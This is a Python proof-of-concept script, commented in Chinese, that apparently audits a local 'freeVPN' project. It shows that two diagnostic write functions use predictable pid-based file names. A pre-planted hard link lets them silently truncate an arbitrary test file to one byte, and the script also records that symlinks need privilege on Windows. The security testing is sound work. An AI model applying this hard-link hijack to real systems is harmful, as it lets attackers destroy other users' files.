# -*- coding: utf-8 -*-
"""C4 · diag-write / write_confined 的固定可预测文件名 + 硬链接跟随

验证:
  C4-a `.freevpn-diag-<pid>` 的 pid 就是本进程 pid, 完全可预测
  C4-b 事先把该名字做成指向任意文件的**硬链接**, diag-write 的
       `f.write_text("x")` 会把目标文件截断为 1 字节
  C4-c 同一个模式在 security.write_confined() 的 `.wtest-<pid>` 上同样成立
  C4-d 符号链接在 Windows 上的可行性 (需要特权, 大概率不行 —— 一并记录)
  C4-e diag-write 会在 E:\\AI 下**永久创建** _writecheck 目录 (收尾清理)
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, r"E:\AI\freeVPN")
import pool  # noqa: E402
import security as sec  # noqa: E402

TMP = Path(r"E:\AI\_c_test")
TMP.mkdir(parents=True, exist_ok=True)
PID = os.getpid()


def banner(t):
    print("\n" + "=" * 72)
    print(t)
    print("=" * 72)


banner("C4-a · 文件名里的 pid 就是本进程 pid")
print(f"  os.getpid() = {PID}")
print(f"  diag-write 会写: {sec.app_root() / f'.freevpn-diag-{PID}'}")
print(f"  write_confined 会写: {sec.app_root() / f'.wtest-{PID}'}")

# ---------------------------------------------------------------------------
banner("C4-b · 硬链接预置 -> diag-write 覆盖任意文件 (同卷)")
victim = TMP / "victim_diag.txt"
victim.write_text("ORIGINAL-IMPORTANT-CONTENT-" * 40, encoding="utf-8")
print(f"  受害者文件 {victim}")
print(f"    原始大小 {victim.stat().st_size} 字节, 头 60 字节: "
      f"{victim.read_text()[:60]!r}")

hl = sec.app_root() / f".freevpn-diag-{PID}"
if hl.exists():
    hl.unlink()
os.link(str(victim), str(hl))
st = victim.stat()
print(f"  os.link({victim.name} -> {hl.name}) 成功")
print(f"    victim 的硬链接数 nlink = {st.st_nlink}")
print(f"    创建硬链接是否需要管理员: 否 (os.link 在 Windows 上无特权要求)")

print("\n  >>> 执行 pool.cmd_diag_write(None)  (用户会主动跑的诊断命令)")
_writecheck = sec.app_root().parent / "_writecheck"
wc_existed_before = _writecheck.exists()
try:
    rc = pool.cmd_diag_write(None)
finally:
    pass
print(f"  cmd_diag_write 返回码: {rc}")

after = victim.stat()
print(f"\n  受害者文件现在:")
print(f"    大小 {after.st_size} 字节 (原 {st.st_size})")
print(f"    内容: {victim.read_text(encoding='utf-8', errors='replace')[:60]!r}")
print(f"    nlink = {after.st_nlink}  (硬链接已被 diag-write 的 unlink 清掉)")
print(f"  >>> 任意文件被静默截断为 1 字节: {after.st_size == 1}")
if hl.exists():
    hl.unlink()

# ---------------------------------------------------------------------------
banner("C4-c · write_confined() 的 .wtest-<pid> 同样可被硬链接劫持")
victim2 = TMP / "victim_wtest.txt"
victim2.write_text("SECOND-VICTIM-CONTENT-" * 40, encoding="utf-8")
size2 = victim2.stat().st_size
hl2 = sec.app_root() / f".wtest-{PID}"
if hl2.exists():
    hl2.unlink()
os.link(str(victim2), str(hl2))
print(f"  {victim2}  原始 {size2} 字节")
print(f"  预置硬链接 {hl2.name}")
conf = sec.write_confined()
after2 = victim2.stat()
print(f"  write_confined() 返回: {conf!r}")
print(f"  受害者文件现在 {after2.st_size} 字节, 内容 "
      f"{victim2.read_text(encoding='utf-8', errors='replace')[:40]!r}")
print(f"  >>> 被截断: {after2.st_size == 1}")
if hl2.exists():
    hl2.unlink()

# ---------------------------------------------------------------------------
banner("C4-d · 符号链接在 Windows 上是否可行 (需要特权)")
sl_target = TMP / "victim_symlink.txt"
sl_target.write_text("SYMLINK-VICTIM-" * 20, encoding="utf-8")
sl = sec.app_root() / f".freevpn-diag-{PID}"
try:
    os.symlink(str(sl_target), str(sl))
    print("  os.symlink 成功 —— 符号链接同样可用")
    sl.unlink()
except OSError as e:
    print(f"  os.symlink 失败: {type(e).__name__}: {e}")
    print("  (Windows 默认要求 SeCreateSymbolicLinkPrivilege 或开发者模式)")

banner("C4-e · diag-write 的目录副作用")
print(f"  E:\\AI\\_writecheck 实验前存在: {wc_existed_before}")
print(f"  E:\\AI\\_writecheck 现在存在:   {_writecheck.exists()}")
if _writecheck.exists() and not wc_existed_before:
    print("  >>> diag-write 会在程序上一级目录永久创建一个 _writecheck 目录, "
          "不清理")
    try:
        _writecheck.rmdir()
        print("  (已清理)")
    except OSError as e:
        print(f"  (清理失败: {e})")

print("\n" + "=" * 72)
print("C4 完成")
print("=" * 72)
